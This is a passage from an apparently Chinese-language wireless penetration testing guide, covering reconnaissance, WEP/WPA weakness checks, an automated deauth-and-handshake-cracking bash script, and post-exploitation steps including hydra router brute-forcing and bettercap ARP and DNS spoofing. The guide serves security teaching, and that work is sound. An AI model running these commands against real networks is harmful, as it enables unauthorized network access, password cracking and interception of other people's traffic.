#### 2.2 侦察阶段（Reconnaissance）

**被动侦察：**
```bash
# Kismet 全信道被动扫描（不发送任何数据包）
kismet -c wlan0mon -c wlan1mon
# 结果输出：Kismet会记录所有AP和客户端的详细信息

# airodump-ng 全信道扫描
airodump-ng --band abg -w passive_scan --output-format pcap,csv,netxml wlan0mon
# --band abg: 同时扫描2.4GHz和5GHz
# -w: 保存输出文件前缀
# --output-format: 输出格式

# 分析扫描结果（CSV文件）
# AP列表：BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
# 客户端列表：Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
```

**主动侦察：**
```bash
# 定向扫描特定信道
airodump-ng -c 1,6,11 -w active_scan wlan0mon

# 探针请求扫描（捕获客户端的探针请求）
airodump-ng --output-format pcap -w probe_requests wlan0mon
# 分析Probe Requests可发现客户端之前连接过的网络

# 使用wireshark分析抓包
# 过滤器：
# wlan.fc.type_subtype == 4   # 探针请求
# wlan.fc.type_subtype == 5   # 探针响应
# wlan.fc.type_subtype == 8   # 信标帧
# wlan.fc.type_subtype == 11  # 认证帧
# wlan.fc.type_subtype == 0   # 关联请求
```

#### 2.3 漏洞评估阶段（Vulnerability Assessment）

**加密方式评估：**
```bash
# 评估脚本示例 - 快速识别弱安全配置
# 从airodump-ng的CSV输出中提取信息

# 1. 识别WEP网络（高危）
grep -i "WEP" passive_scan-01.csv

# 2. 识别WPA/TKIP网络（中危）
grep -i "TKIP" passive_scan-01.csv

# 3. 识别WPS启用的AP（需要主动探测）
wash -i wlan0mon
# 输出包含BSSID, Channel, Signal, WPS Version, WPS Locked, ESSID

# 4. 识别开放网络（高危）
grep -i "OPN" passive_scan-01.csv

# 5. 识别WPA3网络（较安全）
# 通过RSN信息元素中的AKMP识别
```

**AP安全配置审计：**
```bash
# 检查项目清单
├── 加密方式：WEP / WPA-TKIP / WPA2-CCMP / WPA3-SAE / 开放
├── WPS状态：启用/禁用/锁定
├── 管理帧保护(MFP)：Required / Optional / Disabled
├── 802.11r (快速漫游)：启用/禁用
├── 802.11w (管理帧保护)：启用/禁用
├── SSID广播：启用/禁用
├── 客户端隔离：启用/禁用
├── 厂商默认配置检查
└── 固件版本识别（通过信标帧信息）
```

#### 2.4 攻击利用阶段（Exploitation）

**攻击优先级排序：**
```
攻击优先级（从高到低）：
1. 开放网络 → 直接接入
2. WEP网络 → 高概率快速破解
3. WPS未锁定 → Pixie Dust攻击或暴力破解
4. WPA/WPA2 + 弱密码 → 字典攻击
5. WPA Enterprise → EAP降级/凭证窃取
6. WPA3 → Dragonblood等高级攻击（难度高）
7. 企业级AP → 管理界面漏洞利用
```

**标准攻击流程脚本化：**
```bash
#!/bin/bash
# WiFi渗透测试自动化脚本框架
# 注意：仅用于授权测试

TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CHANNEL=6
INTERFACE="wlan0mon"
WORDLIST="/usr/share/wordlists/rockyou.txt"
OUTPUT_DIR="pentest_results"

mkdir -p "$OUTPUT_DIR"

echo "[*] 开始无线渗透测试..."
echo "[*] 目标BSSID: $TARGET_BSSID"
echo "[*] 目标信道: $TARGET_CHANNEL"

# 步骤1：捕获WPA握手包
echo "[1/5] 启动airodump-ng捕获握手包..."
airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID \
    -w "$OUTPUT_DIR/capture" $INTERFACE &
AIRODUMP_PID=$!

# 等待airodump启动
sleep 5

# 步骤2：发送Deauth包
echo "[2/5] 发送解除认证帧..."
aireplay-ng -0 5 -a $TARGET_BSSID $INTERFACE

# 等待握手包
echo "[3/5] 等待握手包捕获（最多60秒）..."
for i in $(seq 1 12); do
    if aircrack-ng "$OUTPUT_DIR/capture-01.cap" 2>/dev/null | grep -q " handshake"; then
        echo "[+] 捕获到握手包！"
        break
    fi
    sleep 5
done

# 停止airodump
kill $AIRODUMP_PID 2>/dev/null
wait $AIRODUMP_PID 2>/dev/null

# 步骤3：验证握手包
echo "[4/5] 验证握手包..."
aircrack-ng "$OUTPUT_DIR/capture-01.cap" 2>&1 | grep -E "handshake|WPA"

# 步骤4：开始破解
echo "[5/5] 启动密码破解..."
aircrack-ng -w "$WORDLIST" -b $TARGET_BSSID "$OUTPUT_DIR/capture-01.cap" \
    > "$OUTPUT_DIR/crack_result.txt" 2>&1

echo "[*] 测试完成，结果保存在 $OUTPUT_DIR/"
```

#### 2.5 后渗透阶段（Post-Exploitation）

```bash
# 成功接入网络后的操作

# 1. 获取IP地址
dhclient wlan0
# 或静态配置
ip addr add 192.168.1.100/24 dev wlan0
ip route add default via 192.168.1.1

# 2. 网络发现
netdiscover -i wlan0 -r 192.168.1.0/24
nmap -sn 192.168.1.0/24

# 3. 端口扫描
nmap -sV -sC -p- 192.168.1.1  # 扫描路由器
nmap -sV -sC 192.168.1.0/24   # 扫描整个网段

# 4. 路由器管理界面测试
# 常见默认凭证列表
# admin/admin, admin/password, admin/1234, 等等
hydra -L userlist.txt -P passlist.txt 192.168.1.1 http-get /

# 5. 流量嗅探
tcpdump -i wlan0 -w post_exploit.pcap
wireshark -k -i wlan0

# 6. 中间人攻击
bettercap -iface wlan0
> net.probe on
> net.sniff on
> dns.spoof on
> arp.spoof on
```

### 四、无线渗透测试报告关键指标

| 指标类别 | 具体指标 | 说明 |
|---------|---------|------|
| **发现统计** | 发现AP总数 | 被动扫描发现的所有AP |

| | 发现客户端数 | 关联和未关联的客户端 |

| | WPA-TKIP网络数 | 已知可破解 |
| | WPA2-CCMP网络数 | 当前标准 |
| | WPA3网络数 | 最新标准 |
| | 开放网络数 | 无加密 |
